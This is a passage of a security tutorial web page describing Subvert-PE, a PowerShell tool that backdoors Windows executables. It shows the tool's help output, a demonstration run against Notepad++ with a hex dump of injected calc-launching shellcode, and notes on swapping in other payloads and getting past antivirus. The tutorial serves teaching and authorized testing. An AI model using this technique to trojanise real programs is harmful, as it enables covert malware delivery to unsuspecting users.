+<img src="images/PE_8_big.png" alt="" class="pic" /><p>&nbsp;</p>
+
+<h2 class="title">Subvert-PE<span class="line"></span></h2>
+<p>Time to get to the good part I suppose! If we wanted to backdoor a PE we would generally perform the following steps: (1) calculate the offset to the null-byte padding for the first executable section, (2) replace the module entry point with an offset to that location, (3) write our shellcode at that offset (4) append a stub to the shellcode which jumps back to the legitimate entry point. The following representation illustrates the execution flow.</p><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre> __________________________________________
+|                                          |
+|               PE Header                  |
+|                                          |
+|                                          |
+|           Entry Point Offset             | ---->----
+|                                          |          |
+|__________________________________________|          |
+|                                          |          |
+|               ..........                 |          |
+|__________________________________________|          |
+|                                          |          |
+|         First Executable Section         |          |
+|            (Probably .text)              |          |
+|                                          |          |
+|          Legitimate Entry Point          |&lt;---------|----
+|                                          |          |    |
+|                                          |          |    |
+|                                          |          |    |
+|----[Section End - null-byte Padding]-----|          |    |
+|                                          |          |    |
+|                Shellcode                 |          |    |
+|\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\|  ---&lt;----     |
+|\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\| |             |
+|\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\| |             |
+|\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\| |             |
+|\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\| |             |
+|            Far Jump back to              |  ------->-----
+|         Legitimate Entry Point           |
+|__________________________________________|
+</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>As mentioned in the intoduction, performing these steps is no more complicated than calculating offsets in an array. To this end I created Subvert-PE which dynamically backdoors PE Images with support for x86 and x64. The Subvert-PE function contains shellcode, written by SkyLined, which launches calc. More details about the shellcode can be found <a href="https://code.google.com/p/win-exec-calc-shellcode/">here</a>.<br /><br />
+
+Lets take a look at a practical example.</p><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>. .\ToolKit\Subvert-PE.ps1</span>
+
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>Get-Help Subvert-PE -Full</span>
+
+NAME
+    Subvert-PE
+
+SYNOPSIS
+    Inject shellcode into a PE image while retaining the PE functionality.
+
+    Author: Ruben Boonen (@FuzzySec)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+SYNTAX
+    Subvert-PE -Path &lt;String> [-Write] [&lt;CommonParameters>]
+
+
+DESCRIPTION
+    Parse a PE image, inject shellcode at the end of the code section and dynamically patch the entry
+    point. After the shellcode executes, program execution is handed back over to the legitimate PE entry
+    point.
+
+
+PARAMETERS
+    -Path &lt;String>
+        Path to portable executable.
+
+        Required?                    true
+        Position?                    named
+        Default value
+        Accept pipeline input?       false
+        Accept wildcard characters?
+
+    -Write [&lt;SwitchParameter>]
+        Inject shellcode and overwrite the PE. If omitted simply display "Entry Point", "Preferred Image
+        Base" and dump the memory at the null-byte location.
+
+        Required?                    false
+        Position?                    named
+        Default value
+        Accept pipeline input?       false
+        Accept wildcard characters?
+
+    &lt;CommonParameters>
+        This cmdlet supports the common parameters: Verbose, Debug,
+        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
+        OutBuffer and OutVariable. For more information, type,
+        "get-help about_commonparameters".
+
+INPUTS
+
+OUTPUTS
+
+    -------------------------- EXAMPLE 1 --------------------------
+
+    C:\PS>Subvert-PE -Path C:\Path\To\PE.exe
+
+    -------------------------- EXAMPLE 2 --------------------------
+
+    C:\PS>Subvert-PE -Path C:\Path\To\PE.exe -Write
+
+RELATED LINKS
+     http://www.fuzzysecurity.com/
+
+     
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>Subvert-PE -Path 'C:\Program Files\Notepad++\notepad++.exe' -Write</span>
+
+Legitimate Entry Point Offset:   0x000B7159
+Preferred PE Image Base:         0x00400000
+
+Null-Byte Padding dump:
+
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+Modified Entry Point Offset:     0x000DA6B6
+Inject Far JMP:                  0xe9fffdca54
+
+Null-Byte Padding After:
+
+31 D2 52 68 63 61 6C 63 89 E6 52 56 64 8B 72 30 8B 76 0C 8B 76
+AD 8B 30 8B 7E 18 8B 5F 3C 8B 5C 1F 78 8B 74 1F 20 01 FE 8B 4C
+24 01 F9 42 AD 81 3C 07 57 69 6E 45 75 F5 0F B7 54 51 FE 8B 74
+1C 01 FE 03 3C 96 FF D7 E9 54 CA FD FF 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>From the screenshot below we can see that Notepad++ launches normally, only now, it also launches calc!</p><br />
+
+    <p>&nbsp;</p>
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/PE_9_Big.png" rel="prettyPhoto[PowerPE]">
+          <img src="images/PE_9_Small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Notepad++ calc</p>
+      </div>
+    
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p>The screenshots below show some sample injections on Windows 7 Professional 32-bit & Windows 8 Enterprise 64-bit.</p><br />
+
+    <p>&nbsp;</p>
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/PE_10_Big.png" rel="prettyPhoto[PowerPE]">
+          <img src="images/PE_10_Small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Win 7 / 32-bit</p>
+      </div>
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/PE_11_Big.png" rel="prettyPhoto[PowerPE]">
+          <img src="images/PE_11_Small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Win 8 / 64-bit</p>
+      </div>
+    
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p><font color=#ffffff><strong>Notes:</strong></font><br />
+<strong>(1)</strong> The success rate for the script is about 90% on 32-bit PE executables; unfortunately this drops down to about 50% on 64-bit. This is because the null-byte padding is much smaller for x64 PE's. As a rule of thumb you should execute the script without the "-Write" flag, if you see there appears to be enough space for your shellcode then the odds are good that it will work.<br /><br />
+<strong>(2)</strong> Obviously the shellcode can be exchanged with something more useful, however for brevity and to limit abuse this is not covered here. There are a few things you need to keep in mind: the shellcode can not have an exit function as we need to preserve execution flow, the shellcode can not unpack itself when it executes as the PE code section is not writeable and in a minority of test-cases the PE required the initial registry values to function properly so the shellcode will need restore these after execution.<br /><br />
+<strong>(3)</strong> Injecting into signed binaries will invalidate the signature but that is probably only a concern when dealing with forensics. Furthermore, as we are hiding shellcode in bespoke executables, the AV has no idea what is going on and will happily let the program run. I did find that Comodo notices that changes have been made to the PE. As a result it isolates the executable but still allows the shellcode to execute. I suspect it detects that the entry point has been tampered with.<br /><br />
+<strong>(4)</strong> Don't be a jackass, this tool was created for authorized use only!<br />
+</p>
+
+
+</div>
+    </div>
+</div>
+      
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../index.html">Home</a> |
+          <a href="../tutorials.html">Tutorials</a> |
+          <a href="../coding.html">Scripting</a> |
+          <a href="../exploits.html">Exploits</a> |
+          <a href="../links.html">Links</a> |
+          <a href="../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
+
